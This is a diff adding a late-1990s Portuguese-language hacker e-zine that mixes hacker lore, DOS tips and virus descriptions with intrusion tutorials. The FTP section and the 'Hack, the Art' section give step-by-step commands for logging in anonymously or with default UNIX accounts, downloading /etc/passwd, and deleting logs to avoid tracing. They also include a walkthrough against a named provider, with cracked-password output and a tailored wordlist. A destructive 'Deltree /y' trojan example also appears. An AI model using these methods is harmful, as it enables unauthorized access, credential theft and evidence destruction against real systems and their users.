@@ -1,0 +1,432 @@
+CSZ - Cheat Struck Zine
+edição 1 (collector edition)
+por: Cheat Struck
+
+Utilize o Notepad(bloco de notas) e abilite a mudança automatica de linha.
+
+*****************************************************************************
+Indice:
+	1. Introdução
+	2. Kevin Mitnick
+	3. Manifesto
+	4. Bugs
+	5. Programação
+	6. Invasão de privacidade
+	7. VIRII
+	8. Phreaking
+	9. Hack, the Art
+	10. Preview
+
+*****************************************************************************
+1. Introdução
+
+	Depois de gastar todas as minhas economias(que eu guardei para comprar u laptop nos EUA) em camisas de times(Dortmound), de seleções(France) , numa bola da adidas oficial(da copa do mundo de 90 e do campeonato Europeu de 92), num canivete borboleta, e em um par de chuteiras novas, eu decidi escrever essa primeira edição do CSZ, que será lembrada até o dia de minha morte( A policia vai me pegar na estrada a caminho de Buenos Aires e eu não vou querer voltar para aquele chiqueiro da prisão então vou explodir os meus miolos com o 38 que usei para matar o presidente dos EUA).
+	A seção "Invasão de privacidade" tá D+! Com o guia completo de invasão por FTP, escrito por mim.
+	Tá mas chega de tanta baboseira e vamos logo ao que enteresa, que eu tenho um jogo da familia para ganhar( se bem que nem é a minha familia e sim a de um amigo meu).
+
+*****************************************************************************
+2. Kevin Mitnick
+
+	Na noite de natal de 1994, o mais famoso e procurado hacker americano, Kevin Mitnick, invadiu a sua rede particular, Tsutomu Shimomura, um dos maiores especialistas de segurança dos Estados Unidos, e roubou alguns dos seus programas, dentre eles, um software de programação dos celulares Oki, que lhe permitiria ter um controle total sobre suas ligações clandestinas e escutas de ligações.
+	Esta história, é claro, foi desmentida por Kevin, que apesar do sabido interesse no referido telefone, não demonstrava aptidão suficiente para realizar um ataque desta grandeza.
+	Apesar deste ataque ter sido teorizado há muitos anos, somente na metade desta década ele ficou mundialmente conhecido.
+	Kevin só foi pego por ele porque usava um celular clonado para acessar ilegalmente uma serie de computadores.
+
+*****************************************************************************
+3. Manifesto.
+
+	Este texto foi extraido do livro "A consciencia de um hacker"
+
+	Mais outro foi pego hoje, está tudo nos jornais. "Adolescente preso em Escândalo do Crime do Computador", "Hacker preso após trapaça em Banco".
+	Alguma vez, olhou atrás dos olhos de um hacker? Você já imaginou o que faz ele agir, quais forças balançam ele, o que o tornou assim?
+	Eu sou um Hacker, entre para o meu mundo.
+	Meu mundo é aquele que começa na escola... Eu sou mais esperto que os outros, esta besteira que nos ensinam, me aborrece. Eles todos são iguais. Eu estou no ginásio. Eu ouvi os professores explicarem pela quinquagésima vez como reduzir uma fração. Eu entendo como.
+	"Não, Sra. Smith, eu não mostrei meu trabalho. Eu fiz na cabeça.". Tudo o que ele faz é jogar jogos. Eles são todods iguais. E então aquilo acontece... uma porta aberta para o mundo... surfando pela linha telefônica como adrenalina nas veias, um comando enviado, um refugo da incompetência de procurar no dia-a-dia...
+	Uma BBS é achada. É isto... é aqui que eu pertenço. Eu conheço todo mundo aqui... Mesmo que eu nunca conheci eles, nunca conversei e até nunca os vi... Eu conheço todos vocês.
+	Nós fomos alimentados com comida de bebê na escola quando queriamos bifes. Os pedaços de carne que você deixou escapar pré-cozidos e sem gosto. Nós fomos dominados por sádicos, ou ignorados por patéticos. Os poucos que tiveram algo a nos ensinar quando eramos crianças, acharam-nos dispostos a tudo, mas estes são como lagos d'água no deserto. Este é o nosso mundo agora.
+	O mundo do eletron e da mudança, a beleza do modem. Nós fazemos uso de um serviço já existente sem pagar por aquilo que seria bem barato se não fosse usado por gulosos atrás de lucros, e vocês chamam de criminosos.
+	Nós exploramos... e vocês nos chamam de criminosos. Nós procuramos por conhecimento... e vocês nos chamam de criminosos. Nós existimos sem cor de pele, sem nacionalidade, sem religião... e vocês nos chamam de criminosos. 	Vocês constroem bombas atômicas, vocês começam guerras, assassinam, trapaceam, mentem para nós e tentam fazer que acreditamos que é para nosso próprio bem, sim, nós somos os criminosos.
+	Sim, eu sou um criminoso. Meu crime é o da curiosidade. Meu crime é o de julgar pessoas pelo o que elas dizem e pensam, nao pela sua  aparencia. Meu crime é de desafiar vocês, algo que vocês nunca me farão esquecer.
+	Eu sou um Hacker e este é o meu manifesto. Vocês também podem me parar, mas não podem parar todos nós...
+	Apesar de tudo, nós somos todos iguais.
+
+								o mentor
+
+*****************************************************************************
+4.Bugs
+
+	Esta seção talvez permaneça no restante das edições do zine. Ela vai apontar varios bugs de vários sistemas operacionais e programas.
+	Começarei com uns bugs simples para DOS versão 4.00 ou inferiores:
+
+1. A utilização do "|" no DOS:
+	As vezes ao utilizar a divisória "|" no Dos/prompt, seguido de comandos externos e internos, poderá ocorrer um "tilt" paralizando todo o sistema. Teste com o comando:
+echo y| debug				'Debug é um comando externo
+echo y| copy con file1.txt		'Se for executado em uma janela não 					 poderá ser fechada
+
+2. Falta de caracteres para nomes de arquivos de DOS:
+	Isso já é bem conhecido. Quando você nomeia/renomeia um arquivo no Windows, colocando mais de 8 letras. No Dos aparecerá algo como "Arquiv~1" (isto é só um exemplo). Isto porque o sistema MS-DOS foi lançado na época dos XTs quando 8 caracteres ocupavam uma boa parte do HD da máquina(20 ou 30 Mb). Então se um nome qualquer possuir mais de 8 bytes (sem contar a extensão) ele será reconhecidono Dos com o ~ seguido de um numero: "arquiv~1", "arquiv~2", etc...
+	Só um detalhe: Quando você da um dir, o nome completo do arquivo se encontra na fileira depois das horas.
+
+3. Copia de arquivos vasios:
+	Se por acaso existe um file arrecem criado e que não foi editado ainda, ou seja possui 0 bytes. Então você planeja copia-lo para um dir diferente para começar a editalo a partir de lá. Você utilizaria o comando:
+copy FILE.0Bt c:\destino
+	Só que como este file tem 0bytes ele não será reconhecido pelo DOS e sendo assim a msg que aparecerá será: "0 arquivo(s) copiado(s)".
+	Outra coisa. Você quer apenas criar um file para uzalo depois então para agilizar as coisas, ao invés de você utilizar o "edit" você usa o "copy con". Se você digitar qualquer besteira ou simplesmente uma única letra e depois apertar F6 + Enter(para sair), o arquivo será gravado e reconhecido. Agora se você não digitar absolutamente nada, e apertar F6 + Enter, você sairá do copy con porém não irá gravar nenhm arquivo no HD e aparecerá novamente a msg "0 arquivo(s) copiado(s)"
+
+*****************************************************************************
+5. Programação
+
+	Na edição de hoje vão alguns comandos uteís de VB exclusivamente para operação do sistema. Na lista a seguir, um asterisco(*) indica o nome do comando, as iniciais St significam Sintaxe, e Ex significa Exemplo.
+
+*ChDir
+ Muda o diretório.
+ St: Chdir <caminho>
+ Ex: ChDir "C:\Windows"
+
+*ChDrive
+ Muda o drive.
+ St: ChDrive <Letra do drive>
+ Ex: ChDrive "C"
+
+*CurDir
+ Indica o diretório corrente.
+ St: CurDir <Letra do drive>
+ Ex: Label1 = CurDir("C")
+
+*FileCopy
+ Copia um arquivo.
+ St: FileCopy <arquivo>, <Destino>
+ Ex: FileCopy "C:\Config.Sys", "a:\"
+
+*FileDateTime
+ Indica a Data e Hora que o file foi criado.
+ St: FileDateTime <arquivo>
+ Ex: FileDateTime "C:\Windows\win.ini"
+
+*FileLen
+ Indica o tamanho do arquivo em bytes.
+ St: FileLen <arquivo>
+ Ex: FileLen "C:\Autoexec.bat"
+
+*GetAttr
+ Indica atributos do arquivo.
+ St: GetAttr <arquivo>
+ Ex: GetAttr "C:\io.sys"
+
+*Kill
+ Deleta um arquivo.
+ St: Kill <arquivo>
+ Ex: Kill "c:\windows\teste.txt"
+
+*MkDir
+ Cria um novo Diretório.
+ St: MkDir <dirório>
+ Ex: MkDir "Teste"
+
+*RmDir
+ Remove um diretório.
+ St: RmDir <diretório>
+ Ex: RmDir "Teste"
+ Atenção!!! O diretório pressisa estar vasio para ser removido.
+
+*SetAttr
+ Adiciona um atributo para o file.
+ St: SetAttr <arquivo>, <atributo>
+ Ex: SetAttr "C:\netlog.txt", 2
+ Atenção!!! Os atributos são descritos por numeros(0 = Normal, 1 = Sómente Leitura, 2 = Oculto, 4 = Sistema e 32 = Arquivo)
+
+*****************************************************************************
+6. Invasão de privacidade
+
+	Hoje em dia, o método mais usado para invadir sistemas, ligados à internet, é sem duvida atravéz do protocolo FTP-"Protocolo de Transferencia de arquivos".
+	É tudo bem simples. Digamos que um servidor de FTP seja dirigida por um Lamerzão. Esse lamer é tão bosta que nem sabe o que é um login anonymous. Então você pega e se conecta a esse sistema de FTP usando o login anonymous e pronto você faz o que der na telha. Agora digamos que esse Lamer está administrando um servidor FTP de um servidor. Então provavelmente ele guarda todas as contas dos usuários. Ai então você entra como anonymous e pegua o file /etc/passwd que tem todas as contas dos users e pronto.
+	¡LAMAH HELP! Se você não sabe como se logar como anonymous em um servidor FTP sigua os seguintes passos: 1.Entre no prompt do DOS e digite:
+
+C:\Windows> ftp			<ENTER>
+ftp> open (servidor ftp)	<ENTER>
+CONNECT TO ...
+LOGIN: Anonymous		<ENTER>
+PASSWORD: lll@lll.com.br	<ENTER>
+BEM VINDO AO SERVIDOR ...
+
+	Já se esse administrador sabe o que é um login anonymous e aplicou uma proteção especial para quem se logar dessa maneira você pode tentar usar o login ftp. As vezes não é aplicada uma proteção a esse login por ele ser padrão de alguns UNIXes. Sempre que você ver a mensagem "RESTRICTION PROTECTION APLY" após o logon quer dizer que foi aplicada uma proteção.
+	¡LAMAH HELP! Se você também não sabe como se logar como ftp sigua os passos abaixo:
+
+C:\Windows> ftp			<ENTER>
+ftp> open (servidor ftp)	<ENTER>
+CONNECT TO ...
+LOGIN: ftp			<ENTER>
+PASSWORD: ftp			<ENTER>
+BEM VINDO AO SERVIDOR FTP ...
+
+	Outra maneira de se logar como ftp mas usando um UID mais alto é utilizando o comando quote. Para isso faça o seginte:
+
+C:\Windows> ftp			<ENTER>
+ftp> open (servidor ftp)	<ENTER>
+CONNECT TO SERV...
+LOGIN:				<ENTER>
+PASSWORD:			<ENTER>
+ftp> quote user ftp		<ENTER>
+ftp> quote cwd ~(login)		<ENTER>
+ftp> quote pass ftp		<ENTER>
+BEM VINDO AO ...
+
+	No lugar do login coloque um desses logins: root, sys, daemon, uucp, tty, test, unix, bin, adm, admin, sysman, sysadmin, who, learn, uuhost, guest, host, nuucp, rje, games, sysop, demo ou um outro login que você conheça.
+	São todos logins padrões de sistemas UNIX. Se um deles não funcionar teste os outros. Todos eles tem um UID alto que dá direito ao file passwd. De preferencia aos logins root e bin pois eles tem os UIDs mais alto (0,1).
+	O comando "quote user ftp" vai citar o login ftp; O comando "quote cwd ~(login)" vai citar o diretório do shell; E o comando "quote pass ftp" vai citar o password ftp.
+	A primeira coisa a se fazer quando se entra em um servidor FTP é procurar pelo file passwd. Para acha-lo e puxa-lo sigua os passos:
+
+(Já logado)
+ftp> ls
+200 PORT command successful.
+150 ASCII data connection for /bin/ls ...
+total 14
+.
+..
+bin
+dev
+etc
+pub
+usr
+226 ASCII Transfer complete.
+431 bytes received in ...
+ftp>
+ftp> cd etc
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+150 ASCII data connection for /bin/ls ...
+group
+netconfig
+passwd
+226 ASCII Transfer complete.
+26 bytes received in ...
+ftp>
+ftp> get passwd
+200 PORT command successful.
+150 ASCII data connection for passwd ...
+226 ASCII Transfer complete.
+63 bytes received in ...
+ftp>
+ftp> bye
+GOODBYE
+
+	Pronto você entrou, pegou o file com as contas e saiu. Mas deixou varios vestigios de seu logon. Para apagar esses vestigios, delete o file de log. Não é necessario ser rápido nestes processos como disem alguns textos encontrados na inet. Eu li em um texto que se você ficar mais de 5 minutos no servidor, ele rastreiará o seu ip e aí você se fode. Isso é valido apenas para servidores que usam sistemas antigos como as universidades. Mas se antes da sua saida você apagar o file de log não haverá maneira de te pegarem.
+	Atenção!!! O file de log está localizado em lugares diferentes em cada servidor. Quase sempre está em um diretório que não é padrão do sistema. Pode também existir mais de um arquivos de log. Se você deixar algum intacto as coisas podem complicar para você.
+	Alguns comandos do programa ftp do Windows:
+
+!				'Abre um novo prompt do DOS;
+? ou help 			'Exibe todos os comandos do programa;
+ASCII				'Liga o modo de transferencia por ASCII;
+Binary				'Liga o modo de transferencia Binaria;
+open				'Conecta-se a um server;
+bye ou quit			'Disconecta-se do server e sai do prog;
+disconnect ou close		'Disconecta-se do server;
+get				'Puxa um file do server;
+delete				'Deleta um file do server;
+rename				'Renomeia um file do server;
+send				'Envia um file ao server;
+type				'Mostra conteudo de um file;
+pwd				'Mostra o diretório atual do server;
+ls				'Lista files e dirs;
+cd				'Muda o diretório;
+mkdir				'Cria um dir no server;
+rmdir				'Remove um dir do server;
+quote				'Cita algum comando.
+
+	Uma outra tecnica muito usada e não ilegal, de invadir servidores FTP, é tendo um login de algum cadastrado no server. Para ser mais rápido use o seguinte comando:
+
+C:\Windows> ftp					<ENTER>
+ftp> open (login):(senha)@(servidor ftp)	<ENTER>
+
+	Por hoje é só pessoal!
+
+*****************************************************************************
+7. VIRII
+
+	Como dise na edição passada: virus de computadores são apenas programas muito bem feitos, que podem até mesmo se reproduzirem sósinhos e se espalharem por diversos computadores sem a ajuda do homem.
+	Existem varios tipos de Virus de computador. Veremos a seguir todos os tipos que conheço, até então, com um resumo simples de cada um.
+
+1. Bomba lógica ou Cavalo de Tróia(Trojans)
+	Funcionam como aquela armadilha do cavalo de tróia. Só que aki o user é a cidade de tróia.
+	Para quem não conhece a história, Lá vai: A cidade de Tróia estava em guerra com uma cidade cuja eu não me lembro o nome. Como Tróia era muito protegida( se encontrava na sexta camada, tinha muros de 9m de altura e 5m de espessura, e se encontrava na costa do mar Egeu), a outra cidade não sabia como ataca-la. Então tiveram a idéia de mandar um presente para eles onde o recheio era soldados da cidade rival. O presente era um cavalo gigante de madeira.
+	Sendo assim um programa que poderá ter o nome de ViruScan pode conter um "Deltree /y c:\*.*"
+
+2. Virus de Disco
+	Infectam o setor boot do HD. Sendo assim ele terá controle sobre seu HD e se você pensar em tipo copiar algum file para um disquete. Esse virus pode infectar esse file e com isso infectar outros HDs.
+
+3. Virus de arquivo
+	Infectam na maioria das veses files executaveis ou usados com frequencia nos computadores. Se auto copiam para o inicio ou para o final do file. Ai ele se ativaria e depois executaria o file.
+
+4. Virus Multi-Partite
+	Infectam tanto o disco como os files executaveis.
+
+5. Virus residentes e não residentes
+	Virus não residentes são aqueles que se auto-destroem depois de infectar todos os files especificado.
+	Virus residentes são aqueles que ficam na memória e infectam qualquer file que seja executado até que o computador seja desligado.
+
+6. Virus STEALTH
+	São virus invisiveis. Ou seja, que nenhum antivirus podera detectar.
+	Sempre quando um virus se copia para um file ele aumenta de tamanho e também muda a data de gravação. Alguns virus salvam a data do file e depois a restauram.
+	Se um virus infectar o file COMMAND.COM ele infectará mais cedo ou mais tarde todos os files .COM e .EXE do disco.
+
+7. Companheiros
+	São files com o mesmo nome do file que será executado mas com a extenção .COM e com atributos de oculto.
+	Como os files .COM são executados antes dos .EXE o virus é executado no lugar do file. Nesse virus pode conter os comandos que chamam o file executado após executar o virus. Isso para que o user não desconfie de nada.
+	Esses virus são muito fáceis de serem encontrados pois apenas com o comando DIR /AH o user já pode disconfiar de que pode se tratar de um virus.
+
+8. Virus Polimórficos
+	São virus que se auto-modificam para que um antivirus não possa detecta-lo.
+
+9. Retrovirus
+	São virus que atingem programas antivirus.
+
+	Alguns virus também podem conter Bonbas MBRs, podem estar encriptados para esconder algum dado que user infectado não deve ter conhecimento, e eu acho que é só.
+	Estes são todos os tipos de virus que eu conheço. Se descobrir um outro eu aviso.
+
+"Virus de computador são as primeiras formas de vida construidas pelo homem."
+							      Stephen Hawking
+
+*****************************************************************************
+8. Phreaking
+
+	Aqui estão alguns textos extraidos do "Manual de violação de telefones publicos e privados" escrito por Ton Waits.
+
+	*****Conceitos básicos a respeito de telefonia*****
+	Ao contrário do que muita gente pensa, os fios da linha telefônica possuem uma tensão contínua equivalente a -48 volts. Esta tensão se altera para um valor alternado de 96 volts quando o telefone toca. Portanto, ao lidar com os fios do telefone, tenha o cuidado de não encostar no orelhão, na
+parede, ou em qualquer coisa que possa "aterrá-lo". Este cuidado deve ser redobrado se o telefone for comunitário ou residencial. Levemos também em consideração que se o aparelho possuí uma tensão contínua, significa que ele tem também uma polarização correta (fio positivo e fio negativo).
+	Na instalação do aparelho esta polarização não faz diferença, mas quando o assunto é violação, ela deve ser observada.
+	Vamos lembrar também que existem dois tipos de linhas telefônicas:
+1. Decádicas (ou Pulse) - são as linhas dos prefixos mais antigos do sistema telefônico. A identificação de chamadas se dá através de uma série de sinais (pulsos), que são interpretados pela central telefônica.
+2. Multifrequenciais (ou Tone) - são as linhas dos prefixos mais novos onde trabalham o serviço de CPA (Central telefônica com controle por Programa Armazenado). A identificação de chamadas se dá através da decodificação de tons frequenciais em números.
+
+	*****Pequena FAQ sobre telefonia*****
+
+1. É possível tomar um choque mexendo em fios telefônicos?
+	Como descrito anteriormente, os fios telefônicos possuem uma tensão suficiente para dar choque relativamente forte em uma pessoa. Este valor de tensão pode atingir um patamar em que ele pode dar um verdadeiro coice na pessoa, no momento em que a linha envia o sinal para o telefone tocar.
+	Isto depende muito da situação e da pessoa. Se você estiver com a mão no orelhão e mexer nos fios, você provavelmente vai tomar um choque legal. Se você tiver acabado de comer algo salgado, provavelmente este choque será ainda mais forte, pois o sal aumenta a condutividade do seu corpo.
+
+2. Como faço para fazer chamadas grátis de minha residência?
+	Quando você efetua uma chamada, a central telefônica identifica de onde você está discando, identifica qual o tipo de telefone que você está usando (público ou residencial), e então ela arquiva pra onde está senda feita a ligação e toma as providências necessárias com relação a cobrança.
+	Essa identificação é feita na fonte e não por um sinal enviado pelo seu telefone. Desse modo, é praticamente impossível pra você que está na sua residência, tentar driblar essa tarifação. Imagine que sua linha telefônica não passa de um ramal de PABX.
+
+3. O que é o BINA?
+	O BINA, é um sistema de identificação de chamadas desenvolvido com tecnologia nacional, que permite a quem está recebendo a chamada, visualizar o número do telefone de quem está telefonando para ele.
+	O esquema teve que ser desenvolvido aqui no Brasil, pois o sistema telefônico é tão arcaico, que não existiam pacotes prontos para se adquirir. É como você tentar comprar um Kit Multimídia para um TK-85 ou um MSX.
+	Tal sistema só funciona em linhas Decádicas, portanto, se você quiser passar um trote para alguém, procure se certificar qual o tipo de linha que ela possui. Para isso, basta você dar uma olhada no prefixo e ligar para a sua companhia telefônica local perguntando se ele suporta CPA. Se eles
+falarem que sim, então pode ficar tranqüilo e efetuar a ligação que você não corre o risco de ser descoberto.
+	Mas tome cuidado com o que você vai fazer pois, sob ordem judicial, as companhias locais podem fornecer um rastreamento de chamadas e assim descobrir de onde você telefonou.
+
+4. Existe alguma maneira de se bloquear o BINA?
+	Da mesma maneira que a tarifação, o BINA não pode ser driblado do telefone que você está efetuando a chamada. Quem fornece o número que vai aparecer no aparelho do receptor, é enviado pela central telefônica e não pelo seu telefone.
+	Vale que acrescentar que o sistema não funciona perfeitamente bem e que às vezes não consegue identificar determinada chamada. Ele também não identifica chamadas de telefones públicos.
+
+5. As famosas "boxes" funcionam aqui no Brasil?
+	Como se pode notar nesta seção, o sistema telefônica nacional, trabalha de maneira centralizada ao contrário do americano que trabalha de forma distribuída. E não é por acaso, pois, além de possuírem um número bem maior de linhas telefônicas, os serviços lá são privatizados e diversas
+companhias oferecem linhas telefônicas.
+	A tarifação se dá por diversas identificações enviadas pelos telefones e diversas centrais distribuídas pelo país. O que os "boxes" fazem, e driblar esses sinais enviando outros de diversas frequências diferentes.
+	Por exemplo, você faz uma chamada internacional mas usa uma "box" para enviar um sinal para a central de como esta chamada fosse uma chamada local.
+	Já de telefones públicos (quem já foi pra lá sabe disso), depois que você efetua uma chamada, aparece novamente um tom de linha que fica aguardando o sinal do orelhão que diz que você pagou determinada taxa para o determinado serviço. Neste caso os "boxes" enviam os sinais no lugar do
+orelhão e a chamada é completada. Esses tipos são conhecidos como Red Boxes, mas não funcionam em todos os telefones públicos.
+	Se bem que, ultimamente, as centrais telefônicas estão sendo substituídas por modelos mais novos. Isto ocorre principalmente em São Paulo. Mas caso elas permitam o "boxing", isto será um assunto para um próxima versão desta FAQ.
+
+*****************************************************************************
+9.Hack, the Art
+
+	Você que leu o zine inteiro e está ancioso para chegar nesta seção. Ou talvez nem tenha lido o zine para pular direto para essa seção, ou até não esteja lendo essa bobagem por que quer ir direto ao assunto. Deixeme dizer que isto é uma atitude Lamer. Por isso como o objetivo deste zine é criar novos hackers no Brasil e não novos Lamers(porque já existem muitos) não repita esse ato LAMAH na próxima edição desse zine. Por favor!
+	Eu espero que vocês analizem as técnicas usadas aki para descobrir novas, pois em cada sistema existem no minimo 100 maneiras de se arrombar portões de segurança.
+	Bem nesta edição talvez conduza vários futuros hackers a sua primeira proesa. Essa proesa é roubar Senhas do Provedor Ginet.
+	Para isso precissaremos do programa FTP.EXE(Instalado automaticamente com o protocolo TCP/IP no Windows 95), o descryptador Crack-Jack, e uma wordlist simples.
+	Let's Hack...
+
+1. Abra o programa ftp pelo prompt do DOS;
+2. Conectese com o provedor Ginet(endereço: ginet.com.br);
+3. Utilize o login Anonymous;
+4. Procure e puxe o file passwd;
+5. Disconectesse do provedor;
+6. Rode o programa Crack-Jack;
+7. Indique o file passwd e a wordlist;
+8. Espere descryptar as senhas e pronto.
+
+	¡LAMAH HELP! Mesmo depois de todo aquele sermão de não querer criar novos lamers eu ainda me presto a dar essa ajuda.
+	Se você não sabe como fazer tudo isso apenas sigua o exempo:
+
+ftp> open ginet.com.br					<ENTER>
+Connected to ginet.com.br.
+User : anonymous					<ENTER>
+Password: lll@lll.com.br				<ENTER>
+230 Guest login ok, access restrictions apply.
+ftp> cd etc						<ENTER>
+250 CWD command successful.
+ftp> get passwd						<ENTER>
+200 PORT command successful.
+150 ASCII data connection for passwd ...
+226 ASCII Transfer complete.
+63 bytes received in ...
+ftp>bye							<ENTER>
+GOOD BYE
+
+	Depois para rodar o Crack-Jack faça o seguinte:
+
+Cracker Jack version 1.4 for OS/2 and DOS (386)
+Copyright (C) 1993, The Jackal, Denmark
+PWfile(s) : passwd					<ENTER>
+Wordfile  : wordlist.txt				<ENTER>
+Initializing session data...
+Loaded 52 total accounts with 50 different salts.
+Cracking... (Hit any key for status, Ctrl-C to abort)
+forest    (forest)
+pinara    (9871)
+
+Obs.1: é muito dificil de se encontrar provedores tão retardados como esse.
+Obs.2: você pode passar um mês inteiro tentando descriptar essas senhas. Mas como eu não quero que você passe todo esse tempo para fazer isso. Aí vai um pequena(mesmo) wordlist que provavelmente vai se encaixar com algumas dessas contas.
+
+	Salve como wordlist.txt
+--------------------------------wordlist.txt---------------------------------
+gampert
+regis
+pinara
+rodinei
+patricia
+marcelo
+marcos
+fernando
+debora
+fredi
+bstudio
+bbborges
+setup
+oab_pf
+nuhry
+jtelles
+demo1
+demo2
+demo3
+demo4
+demo5
+cmoura
+glaucia
+pedroso
+cotrijal
+ameplan
+guto
+jmartins
+lguedes
+coopibt
+jferst
+--------------------------------wordlist.txt---------------------------------
+
+Obs.3: Essa técnica foi extraida do zine Axur05 numero1.
+
+*****************************************************************************
+10. Preview
+
+	O que nos espera a próxima edição?
+* Poemas			'Algumas msgs ditas por hackers famosos.
+* Programas Hackers		'Descrição de programas criados por hackers.
+* Bugs				'Um bug fatal para servidores que usam 				 WWWboard em Windows NT.
+* Invasão de privacidade	'Invadindo pelo protocolo TCP/IP.
+* Phreaking			'Começe a entender sobre phreaking.
+
+*****************************************************************************
+By Cheat Struck
